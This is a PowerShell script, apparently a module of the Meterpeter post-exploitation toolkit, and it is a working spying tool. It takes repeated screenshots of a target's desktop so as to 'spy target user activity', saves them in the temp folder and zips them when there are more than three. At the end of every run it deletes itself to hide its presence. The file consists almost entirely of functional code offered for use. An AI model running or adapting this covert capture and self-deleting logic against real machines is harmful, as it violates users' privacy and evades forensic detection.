<#
.SYNOPSIS
   Capture remote desktop screenshot(s)

   Author: r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: System.Windows.Forms {native}
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.2

.DESCRIPTION
   This module can be used to take only one screenshot
   or to spy target user activity using -Delay parameter.

.NOTES
   If sellected more than 3 captures ( screenshots ) Then cmdlet will
   Compress (ZIP) all screenshots before delete them from %Tmp% directory.

.Parameter Screenshot
   Accepts the number of captures to be taken (default: 1)

.Parameter Delay
   Accepts the delay (seconds) between captures (default: 1)

.EXAMPLE
   PS C:\> Get-Help .\Screenshot.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\Screenshot.ps1 -Screenshot 1
   Capture 1 desktop screenshot and store it on %TMP%.

.EXAMPLE
   PS C:\> .\Screenshot.ps1 -Screenshot 5 -Delay 8
   Capture 5 desktop screenshots with 8 secs delay between captures.

.OUTPUTS
   ScreenCaptures Delay  Storage                          
   -------------- -----  -------                          
   1              1(sec) C:\Users\pedro\AppData\Local\Temp
#>


[CmdletBinding(PositionalBinding=$false)] param(
    [int]$Screenshot='0',
    [int]$Delay='1'
)


Write-Host ""
If($Screenshot -gt 0)
{
   $Limmit = $Screenshot+1 ## The number of screenshots to be taken
   If($Delay -lt '1' -or $Delay -gt '180'){$Delay = '1'} ## Screenshots delay time max\min value accepted

   ## Create Data Table for output
   $mytable = New-Object System.Data.DataTable
   $mytable.Columns.Add("ScreenCaptures")|Out-Null
   $mytable.Columns.Add("Delay")|Out-Null
   $mytable.Columns.Add("Storage")|Out-Null
   $mytable.Rows.Add("$Screenshot",
                     "$Delay(sec)",
                     "$Env:TMP")|Out-Null

   ## Display Data Table
   $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
   Get-Content -Path "$Env:TMP\MyTable.log"
   Remove-Item -Path "$Env:TMP\MyTable.log" -Force

   If(-not(Test-Path "$Env:TMP"))
   {
      New-Item "$Env:TMP" -ItemType Directory -Force
   }

   ## Loop Function to take more than one screenshot.
   For($num = 1 ; $num -le $Screenshot ; $num++)
   {
      ## Random Screenshot FileName Generation
      $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 | Get-Random -Count 7 | %{[char]$_})
      $Path = "$Env:TMP\SHot-$Rand.png"
	
      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")|Out-Null
      [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")|Out-Null

      If(-Not [Environment]::UserInteractive)
      {
         Write-Host "[-] WARNING process is not interactive your screen capture will likely fail!" -ForeGroundColor Red -BackGroundColor Black
      }

      $bounds = [System.Windows.Forms.Screen]::AllScreens.Bounds
      $bounds = [Drawing.Rectangle]::FromLTRB(0, 0,  $bounds.Width, $bounds.Height)
      $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
      $graphics = [Drawing.Graphics]::FromImage($bmp)
      $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
          $bmp.Save($Path)
          $graphics.Dispose()
          $bmp.Dispose()

      echo "saved[$num]: $Path"
      Start-Sleep -Seconds $Delay; ## 2 seconds delay between screenshots (default value)
   }
  Write-Host "";Start-Sleep -Seconds 1
}


If($Screenshot -gt 3)
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Compress (ZIP) all .png screenshots!

   .NOTES
      If invoked -screenshot 'int' bigger than '3' then cmdlet
      will compress all .png screenshot files before delete them
      from remote %TMP% working directory leaving only the ZIP.
   #>

   $RandMe = -join (((48..57)+(65..90)+(97..122)) * 80 | Get-Random -Count 4 | %{[char]$_})
   Compress-Archive -Path "$Env:TMP\*.png" -DestinationPath "$Env:TMP\Meterpeter_$RandMe.zip"
   Remove-Item -Path "$Env:TMP\*.png" -EA SilentlyContinue -Force
}

#Auto-Delete CmdLet in the end of execution..
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force